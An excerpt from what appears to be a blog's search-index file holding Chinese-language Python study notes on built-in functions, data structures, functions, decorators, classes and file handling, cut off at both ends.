LL[i-<span class="number">1</span>][j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>)])</span><br><span class="line">    <span class="keyword">return</span> LL</span><br><span class="line">lst = YangHui(<span class="number">34</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="built_in">print</span>(j,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h3 id="2-斐波那契数列"><a href="#2-斐波那契数列" class="headerlink" title="2 斐波那契数列"></a>2 斐波那契数列</h3><h3 id="3-dfs"><a href="#3-dfs" class="headerlink" title="3 dfs"></a>3 dfs</h3>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python</title>
      <link href="/posts/a378bd8e.html"/>
      <url>/posts/a378bd8e.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><blockquote><p><a href="https://www.runoob.com/python3/python3-tutorial.html">Python教程1</a>    <a href="https://docs.python.org/zh-cn/3.10/">official::Python教程</a></p><p><a href="https://www.toolnb.com/tools/pyc.html">反编译</a></p><p><a href=".\4b0178e0">text::数据结构与算法</a> </p></blockquote><hr><h2 id="〇、基本概念"><a href="#〇、基本概念" class="headerlink" title="〇、基本概念"></a>〇、基本概念</h2><blockquote><p>静态语言 编译 先编译再执行 例：C</p><p>脚本语言 解释 边编译边执行 例：python</p></blockquote><hr><h2 id="一、基础语句"><a href="#一、基础语句" class="headerlink" title="一、基础语句"></a>一、基础语句</h2><h3 id="1-print"><a href="#1-print" class="headerlink" title="1 print()"></a>1 print()</h3><blockquote><p><a href="https://www.cnblogs.com/dongye95/p/10197916.html">使用</a>  <a href="https://www.runoob.com/python3/python-func-print.html">参数设置</a></p><p>格式：print(*objects, sep=’ ‘, end=’\n’, file=sys.stdout, flush=False)</p><p>objects — 复数，表示可以一次输出多个对象。输出多个对象时，需要用 , 分隔。</p><p>sep — 用来间隔多个对象，默认值是一个空格。</p><p>end — 用来设定以什么结尾。默认值是换行符 \n，我们可以换成其他字符串。</p><p>file — 要写入的文件对象。</p><p>flush — 输出是否被缓存通常决定于 file，但如果 flush 关键字参数为 True，流会被强制刷新。</p><p>输出百分号的方法：%%</p><p>在函数内赋值：pirnt( val := function() , val ** 2 )</p></blockquote><h3 id="2-eval"><a href="#2-eval" class="headerlink" title="2 eval()"></a>2 eval()</h3><blockquote><p>格式：eval(‘str’)</p><p>作用：计算eval()中的字符串值（数字，列表，字典，元组皆可）（字符串会被当做变量）</p></blockquote><h3 id="3-del-删除"><a href="#3-del-删除" class="headerlink" title="3 del 删除"></a>3 del 删除</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用方法：（不可以删集合元素）</span></span><br><span class="line"><span class="keyword">del</span>  variable[ index ]</span><br></pre></td></tr></table></figure><h3 id="4-…"><a href="#4-…" class="headerlink" title="4  … "></a>4 <strong> … </strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__init__ <span class="comment"># 类的初始化数据</span></span><br><span class="line">__doc__ <span class="comment"># 查看函数属性</span></span><br></pre></td></tr></table></figure><h3 id="5-match"><a href="#5-match" class="headerlink" title="5 match"></a>5 match</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">match</span> num:     <span class="comment"># switch </span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:    <span class="comment"># 自带 break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> _:    <span class="comment">#  default</span></span><br></pre></td></tr></table></figure><h3 id="6-todo"><a href="#6-todo" class="headerlink" title="6 todo"></a>6 todo</h3><blockquote><p><a href="https://blog.csdn.net/PSpiritV/article/details/124388044">pass / …的用法</a></p><p>待做。</p><p>pyCharm中点击下方todo可以看到所有todo。</p></blockquote><hr><h2 id="二、字符串"><a href="#二、字符串" class="headerlink" title="二、字符串"></a>二、字符串</h2><h3 id="1-普通函数"><a href="#1-普通函数" class="headerlink" title="1 普通函数"></a>1 普通函数</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/143426682">字符串函数</a>     <a href="https://zhuanlan.zhihu.com/p/515946321">格式化输出</a> </p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串格式化输出</span></span><br><span class="line"><span class="comment"># &#123; [index][ : [ [fill] align] [sign] [#] [width] [.precision] [type] ] &#125;</span></span><br><span class="line"><span class="built_in">str</span>.<span class="built_in">format</span>(args)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把s按seq分隔符分割[ num 个]数据存在列表中</span></span><br><span class="line">s.split(sep,[ num ])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把seq按 &quot;&quot; 中的东西组成新字符串</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.join(seq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否是数字</span></span><br><span class="line">s.isdigit() ：</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计字符串在 s 中出现次数</span></span><br><span class="line">s.count(<span class="string">&quot;str&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 旧字符换新，最多max次</span></span><br><span class="line">s.replace(old, new[, <span class="built_in">max</span>])</span><br></pre></td></tr></table></figure><h3 id="2-字符串前的符号"><a href="#2-字符串前的符号" class="headerlink" title="2 字符串前的符号"></a>2 字符串前的符号</h3><ul><li>u”str”：后面的字符串会以Unicode格式进行编码，常用于中文。</li><li>r”str”：去掉转义功能。</li><li>b“str”：字符串是 bytes 类型，用于网络传输中</li><li>f“str”：识别 str 中的格式化输出</li></ul><hr><h2 id="三、列表与元组"><a href="#三、列表与元组" class="headerlink" title="三、列表与元组"></a>三、列表与元组</h2><h3 id="1-列表"><a href="#1-列表" class="headerlink" title="1 列表"></a>1 列表</h3><blockquote><p>可变数组    list()</p></blockquote><ul><li><p>普通函数  <a href="https://zhuanlan.zhihu.com/p/351605959">链接</a></p></li><li><p>浅拷贝和深拷贝    <a href="https://zhuanlan.zhihu.com/p/388243108">链接</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 两者id相同。</span></span><br><span class="line">a = b </span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维列表复制不关联，二维依旧关联。</span></span><br><span class="line">a = b.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 深拷贝，二维也不关联。</span></span><br><span class="line">a = b.deepcopy() </span><br></pre></td></tr></table></figure></li><li><p>删除</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span>( lst[ index ] )</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-元组"><a href="#2-元组" class="headerlink" title="2 元组"></a>2 元组</h3><blockquote><p>不可改的列表（只可拼接）   tuple()</p></blockquote><ul><li><p>定义</p><blockquote><p>括号可以省略。</p><p>当元组中只有一个元素时，逗号不可省略。（ tup = (1,) ）</p></blockquote></li><li><p>特殊函数</p><ul><li><p>map()   <a href="https://zhuanlan.zhihu.com/p/498413520">链接</a></p><blockquote><p>map() 会根据提供的函数对指定序列做映射。</p></blockquote></li><li><p>zip()    <a href="https://www.runoob.com/python/python-func-zip.html">链接</a></p><blockquote><p>zip() 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。</p></blockquote></li><li><p>enumerate()    <a href="https://www.runoob.com/python/python-func-enumerate.html">链接</a></p><blockquote><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列。（每个值为一个元组（索引，值））</p></blockquote></li><li><p>* + 可迭代对象</p><blockquote><p>解包</p><p>二维列表用：zip(*lst)会获得每一列的值。</p></blockquote></li></ul></li><li><p>嵌套元祖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 判断嵌套元组中是否存在某元素值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_value_in_nested_tuple</span>(<span class="params">value, nested_tuple</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> nested_tuple:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">tuple</span>):  <span class="comment"># 如果当前元素是嵌套元组，则递归调用本函数</span></span><br><span class="line">            <span class="keyword">if</span> is_value_in_nested_tuple(value, item):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> item == value:  <span class="comment"># 如果当前元素与指定值相等，则返回True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 遍历完所有元素都没有找到指定值，则返回False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="四、字典与集合"><a href="#四、字典与集合" class="headerlink" title="四、字典与集合"></a>四、字典与集合</h2><h3 id="1-字典"><a href="#1-字典" class="headerlink" title="1 字典"></a>1 字典</h3><blockquote><p>键值对，dict()</p></blockquote><ul><li><p>注意事项</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># in 测试的是键是否在字典中 </span></span><br><span class="line">key <span class="keyword">in</span> dicts</span><br></pre></td></tr></table></figure></li><li><p>普通函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回所有键信息</span></span><br><span class="line">dic.keys()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回所有值信息</span></span><br><span class="line">dic.values()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回所有键值对（元组形式）</span></span><br><span class="line">dic.items()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回值，不存在返回默认</span></span><br><span class="line">dic.get(key,default)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回值，删除键值对，不存在返回默认</span></span><br><span class="line">dic.pop(key,default)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除最后一个键值对，返回元组</span></span><br><span class="line">dic.popitem()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空</span></span><br><span class="line">dic.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 浅/深拷贝</span></span><br><span class="line">dic.copy()/.deepcopy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按字典2的方式更新字典1</span></span><br><span class="line">dic.update(dicts2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回key对应的值，key不存在返回default</span></span><br><span class="line">dic.get(key, default=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></li><li><p>技巧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典键值互换：</span></span><br><span class="line">dic2 = &#123;value: key <span class="keyword">for</span> key, value <span class="keyword">in</span> dic1.items()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 键最大的键（返回最大值的键值）</span></span><br><span class="line"><span class="built_in">max</span>( dic ) </span><br><span class="line"><span class="comment"># 值最大的值</span></span><br><span class="line"><span class="built_in">max</span>( dic.values() )</span><br><span class="line"><span class="comment"># 键最大的值</span></span><br><span class="line">dic[ <span class="built_in">max</span>(dic) ]</span><br><span class="line"><span class="comment"># 值最大的键</span></span><br><span class="line"><span class="built_in">max</span>( dic, key=dic.get)</span><br><span class="line"><span class="built_in">max</span>( dic,key=<span class="keyword">lambda</span> x:<span class="built_in">len</span>(dic[x])) <span class="comment"># 列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表变成字典</span></span><br><span class="line">lst = [ [ key,value ] , ... ]</span><br><span class="line">dic = <span class="built_in">dict</span>( lst )</span><br></pre></td></tr></table></figure></li><li><p>特殊函数</p><ul><li><p>Counter()   <a href="https://zhuanlan.zhihu.com/p/355601478"> 链接</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计数器，Counter 中的键为待计数的元素，而 value 值为对应元素出现的次数 count。</span></span><br><span class="line"><span class="comment"># 使用Counter应当 from collections import Counter </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="comment">#  实例化元素为空的 Counter 对象</span></span><br><span class="line">a = Counter()</span><br><span class="line"></span><br><span class="line"><span class="comment">#  从可迭代对象中实例化 Counter 对象</span></span><br><span class="line">b = Counter(<span class="string">&#x27;chenkc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  从 mapping 中实例化 Counter 对象</span></span><br><span class="line">c = Counter(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  从关键词参数中实例化 Counter 对象</span></span><br><span class="line">d = Counter(a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>)</span><br></pre></td></tr></table></figure></li><li><p>pyCharm快速添加引号</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1. ctrl + r</span><br><span class="line"></span><br><span class="line">2. 上方填入(.*?):(.*)，选择正则表达式</span><br><span class="line"></span><br><span class="line">3. 下方填入&#x27;$1&#x27;:&#x27;$2&#x27;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="2-集合"><a href="#2-集合" class="headerlink" title="2 集合"></a>2 集合</h3><blockquote><p>数学集合，set()</p></blockquote><ul><li><p>操作方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在S中移除，不在不报异常</span></span><br><span class="line">S.discard(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在S中移除，不在报KeyError</span></span><br><span class="line">S.remove(x)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 判断S与T中是否存在相同元素，没有为真</span></span><br><span class="line">S.isdisjoint(T)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交并差补，子集超集</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="五、函数"><a href="#五、函数" class="headerlink" title="五、函数"></a>五、函数</h2><h3 id="1-变量范围"><a href="#1-变量范围" class="headerlink" title="1 变量范围"></a>1 变量范围</h3><ul><li><p>global</p><blockquote><p>全局变量，先定义再使用。</p></blockquote></li><li><p>nonlocal</p><blockquote><p>非局部变量，可以被函数外的函数使用，先定义再使用，外部函数也要有该变量。</p></blockquote></li></ul><h3 id="2-自定义函数"><a href="#2-自定义函数" class="headerlink" title="2 自定义函数"></a>2 自定义函数</h3><ul><li><p>普通定义</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">funcname</span> ( paras : types ) -&gt; types :</span><br><span class="line">    statements</span><br><span class="line">    [ <span class="keyword">return</span> [ expression ] ]</span><br></pre></td></tr></table></figure></li><li><p>函数嵌套</p><blockquote><p>函数内部定义函数并在函数内部使用。</p><p>也可以把内部函数作为返回值返回给外部。（闭包：内部函数使用了外部函数的变量）</p></blockquote></li><li><p>函数参数    <a href="https://zhuanlan.zhihu.com/p/50804195">args</a></p><ul><li><p>位置参数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依次赋值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a,b</span>)</span><br><span class="line">test (<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li><li><p>赋值参数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接赋值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a,b</span>)</span><br><span class="line">test (b=<span class="number">1</span>,a=<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li><li><p>默认参数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不赋值将使用默认值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span> (a,b=<span class="number">2</span>)</span><br><span class="line">test (<span class="number">1</span>)</span><br><span class="line"><span class="comment">#默认参数注释为 (b:int=2)</span></span><br></pre></td></tr></table></figure></li><li><p>可变参数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一个星号：输入的多个值以元组保存，输入：1,2,3，注意：此时值直接转化成列表为 [( 1,2,3 )]</span></span><br><span class="line"><span class="comment"># 两个星号：输入的多个值以字典保存，输入：a=5,b=6,c=7</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span> ( name, *args , **kwargs ):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>字符串名访问函数</p><blockquote><p><a href="https://www.cnblogs.com/JIM-FAN/p/12782568.html">链接</a></p></blockquote><p><code>eval( str )()</code></p></li></ul><h3 id="3-yield"><a href="#3-yield" class="headerlink" title="3 yield"></a>3 yield</h3><blockquote><p>yield 的作用就是把一个函数变成一个 generator。</p><p>在 for 循环执行时，每次循环都会执行 fab 函数内部的代码，执行到 yield b 时，fab 函数就返回一个迭代值。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例（10以内的阶乘）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jie</span>(<span class="params">now</span>):</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, now + <span class="number">1</span>):</span><br><span class="line">        count *= i</span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line">        <span class="keyword">yield</span> count</span><br><span class="line">jar = jie(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> jar :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&quot;</span>.<span class="built_in">format</span>(i), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">    i = jar.__next__()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure><h3 id="4-匿名函数"><a href="#4-匿名函数" class="headerlink" title="4 匿名函数"></a>4 匿名函数</h3><p><code>lambda parameters : expression</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按出现次数最多从小到大排序</span></span><br><span class="line">cnt = Counter(barcodes)</span><br><span class="line">barcodes.sort(key=<span class="keyword">lambda</span> x: (-cnt[x], x))</span><br></pre></td></tr></table></figure><h3 id="5-常用函数"><a href="#5-常用函数" class="headerlink" title="5 常用函数"></a>5 常用函数</h3><ul><li><p>数学操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#返回绝对值</span></span><br><span class="line"><span class="built_in">abs</span>(num)</span><br><span class="line"><span class="comment"># 返回浮点数四舍五入后的值（int()是向下取整）</span></span><br><span class="line"><span class="built_in">round</span>(num)</span><br><span class="line"><span class="comment"># 返回 dividend/divisor 和 dividend%divisor 的元组</span></span><br><span class="line">quotient,remainder = <span class="built_in">divmod</span>( dividend , divisor ) </span><br></pre></td></tr></table></figure></li><li><p>转化函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># int()  str-&gt;int（字符串数字依照base规则转成十进制）</span></span><br><span class="line"><span class="built_in">int</span>(<span class="built_in">str</span>, base=<span class="number">10</span>)  <span class="comment"># str是字符串，base表示进制，默认十进制。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex()  int-&gt;int（十进制转十六进制）</span></span><br><span class="line"><span class="built_in">hex</span>() <span class="comment"># 函数用于将10进制整数转换成16进制，以字符串形式表示。返回 &#x27;0x....&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bin()  int-&gt;int（十进制转二进制）</span></span><br><span class="line"><span class="built_in">bin</span>() <span class="comment"># 返回一个整数 int 或者长整数 long int 的二进制表示。返回 &#x27;0b....&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chr()  int-&gt;ASCII（整型转ASCII码）</span></span><br><span class="line"><span class="built_in">chr</span>() <span class="comment"># 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ord()  ASCII-&gt;int（ASCII码转整型）</span></span><br><span class="line"><span class="built_in">ord</span>() <span class="comment"># 主要用来返回对应字符的 ascii 码</span></span><br></pre></td></tr></table></figure></li><li><p>序列操作</p><ul><li><p><a href="https://www.runoob.com/python/python-func-any.html">any()</a>    <a href="https://www.runoob.com/python/python-func-all.html">all()</a> </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于判断给定的可迭代参数 iterable 是否全部为 False，则返回 False，如果有一个为 True，则返回 True。</span></span><br><span class="line"><span class="built_in">any</span>(<span class="built_in">iter</span>)</span><br><span class="line"><span class="comment"># 用于判断给定的可迭代参数 iterable 中的所有元素是否都为 TRUE，如果是返回 True，否则返回 False。</span></span><br><span class="line"><span class="built_in">all</span>(<span class="built_in">iter</span>)</span><br></pre></td></tr></table></figure></li><li><p>filter()   reduce()</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 保留满足function条件的iter，返回列表</span></span><br><span class="line"><span class="built_in">filter</span>(function,<span class="built_in">iter</span>)</span><br><span class="line"><span class="comment"># 按function规则累加，init：初值</span></span><br><span class="line">reduce(function,<span class="built_in">iter</span>[,init])</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="6-装饰器"><a href="#6-装饰器" class="headerlink" title="6 装饰器"></a>6 装饰器</h3><blockquote><p><a href="https://www.zhihu.com/question/325817179/answer/798679602">装饰器</a></p><p>多个装饰器从下往上调用。</p><p>定义：在函数调用前先调用闭包的函数，参数传递是传给是闭包的函数。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Do_Add</span>(<span class="params">ad</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">a,b</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">        c = ad(a,b)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;value:%d&quot;</span>%c)</span><br><span class="line">    <span class="keyword">return</span> Add</span><br><span class="line"></span><br><span class="line"><span class="comment">#@Do_Add</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ad</span>(<span class="params">a,b</span>):</span><br><span class="line">    c = a + b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># ad(1,2)</span></span><br><span class="line">myfunc = Do_Add(ad)</span><br><span class="line">myfunc(<span class="number">5</span>,<span class="number">6</span>)</span><br></pre></td></tr></table></figure><ul><li><p>@cache 装饰器 </p><blockquote><p><a href="https://blog.csdn.net/weixin_43646592/article/details/129162138">cache装饰器</a></p><p>一种装饰在被执行的函数上，将其执行的结果缓存起来的缓存装饰器。当下次请求的时候，如果请求该函数的传参未变则直接返回缓存起来的结果而不再执行函数。</p></blockquote></li><li><p>@property</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/64487092">@property装饰器</a></p><p>装饰函数后，该函数会变成属性且变为只读，使用时不用带括号，函数没有参数。</p></blockquote></li></ul><hr><h2 id="六、类与对象"><a href="#六、类与对象" class="headerlink" title="六、类与对象"></a>六、类与对象</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><ul><li><strong>变量</strong><ul><li>成员变量：self</li><li>类变量：方法外定义的变量（相当于静态变量）</li></ul></li><li><strong>方法</strong><ul><li>成员方法：带参self，可以访问类变量和成员变量，可以用对象名访问。</li><li>普通方法：任意参，可以访问类变量和成员变量，可以用对象名和类名访问。</li><li>类方法：类方法装饰器@classmethod，参数cls，可以访问类变量，可以用对象名和类名访问。</li><li>静态方法：静态方法装饰器@staticmethod，无参，不可以访问类变量和成员变量，可以用对象名和类名访问。</li></ul></li></ul><h3 id="2-类中参数"><a href="#2-类中参数" class="headerlink" title="2 类中参数"></a>2 类中参数</h3><ul><li>对象：self</li><li>类：<a href="https://www.cnblogs.com/wayne-tou/p/11896706.html">cls的使用</a></li><li>私有参数：__name</li></ul><h3 id="3-类的继承"><a href="#3-类的继承" class="headerlink" title="3 类的继承"></a>3 类的继承</h3><blockquote><p>继承父类：单个子类不存在就继承，多个从前向后继承，前有则继承前父类。</p></blockquote><h3 id="4-方法重写"><a href="#4-方法重写" class="headerlink" title="4 方法重写"></a>4 方法重写</h3><blockquote><p>super().father_function() 调用父类方法</p></blockquote><h3 id="5-类的重载"><a href="#5-类的重载" class="headerlink" title="5 类的重载"></a>5 类的重载</h3><blockquote><p><a href="https://juejin.cn/post/7113923725333889054">overload</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 类初始化重载</span></span><br><span class="line"><span class="meta">@typing.overload</span></span><br><span class="line">__init__(): <span class="comment">#靠参数注释区分</span></span><br><span class="line"><span class="comment"># 类方法重载</span></span><br><span class="line"><span class="meta">@overload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(): <span class="comment">#靠参数注释区分</span></span><br></pre></td></tr></table></figure><h3 id="6-运算符重载"><a href="#6-运算符重载" class="headerlink" title="6 运算符重载"></a>6 运算符重载</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#加减乘除余</span></span><br><span class="line">__add__</span><br><span class="line">__sub__</span><br><span class="line">__mul__</span><br><span class="line">__div__</span><br><span class="line">__mod__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印或转化 print()、repr()、str()</span></span><br><span class="line">__repr__、__str__ </span><br><span class="line"><span class="comment"># 索引运算</span></span><br><span class="line">__getitem__</span><br><span class="line"><span class="comment"># 索引赋值</span></span><br><span class="line">__setitem__</span><br><span class="line"><span class="comment"># 删除索引和分片</span></span><br><span class="line">__delitem__</span><br><span class="line"><span class="comment"># key in map</span></span><br><span class="line">__contains__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等于/不等于</span></span><br><span class="line">__eq__、__ne__</span><br><span class="line"><span class="comment"># 小于/小于等于</span></span><br><span class="line">__lt__、__le__</span><br><span class="line"><span class="comment"># 大于/大于等于</span></span><br><span class="line">__gt__、__ge__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可迭代（return self.iter.__iter__()，可用 for 依次取出）</span></span><br><span class="line">__iter__</span><br></pre></td></tr></table></figure><hr><h2 id="七、存储"><a href="#七、存储" class="headerlink" title="七、存储"></a>七、存储</h2><h3 id="1-开关文件"><a href="#1-开关文件" class="headerlink" title="1 开关文件"></a>1 开关文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件（mode默认只读，encoding编码方式）</span></span><br><span class="line">myfile = <span class="built_in">open</span> ( filename [ , mode ] [ , encoding= ] )</span><br><span class="line"><span class="comment"># with会在完成工作后自动关闭文件，防止资源占用</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>() <span class="keyword">as</span> name </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">r/w/a：读写追加</span></span><br><span class="line"><span class="string">b：二进制形式</span></span><br><span class="line"><span class="string">+：以读/写方式打开</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#[, newline=None]：保证不同平台换行符被正确读入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">myfile.close()</span><br><span class="line"><span class="comment"># 缓冲区内容写入文件但不关闭文件</span></span><br><span class="line">myfile.flush()</span><br></pre></td></tr></table></figure><h3 id="2-读写数据"><a href="#2-读写数据" class="headerlink" title="2 读写数据"></a>2 读写数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读</span></span><br><span class="line"><span class="comment"># 全读，返回字符串，size限定字符或字节数</span></span><br><span class="line">read( [ size ] )</span><br><span class="line"><span class="comment"># 读一行，返回字符串，size限定当前行字符或字节数</span></span><br><span class="line">readline ( [ size ] )</span><br><span class="line"><span class="comment"># 读全行，返回行列表，hint限定行数</span></span><br><span class="line">readlines ( [ hint ] )</span><br><span class="line"><span class="comment"># 检查可读性</span></span><br><span class="line">readable()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写</span></span><br><span class="line"><span class="comment"># 写str进入文件</span></span><br><span class="line">write( <span class="built_in">str</span> )</span><br><span class="line"><span class="comment"># 写seq_of_str进入文件，seq_of_str为可迭代对象</span></span><br><span class="line">writelines( seq_of_str )</span><br><span class="line"><span class="comment"># 检查可写性</span></span><br><span class="line">writable()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指针</span></span><br><span class="line"><span class="comment"># 获得文件指针位置</span></span><br><span class="line">tell()</span><br><span class="line"><span class="comment"># offset：偏移量，whence：方向（0：从起始位置移动，1：从当前位置移动，2：从结束位置移动，默认0）</span></span><br><span class="line">seek( offset [ , whence ] )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读写对象</span></span><br><span class="line"><span class="comment">#对象写（写一个）</span></span><br><span class="line">pickle.dump( obj , file )</span><br><span class="line"><span class="comment"># 对象读（读一个）</span></span><br><span class="line">pickle.load( file )</span><br></pre></td></tr></table></figure><h3 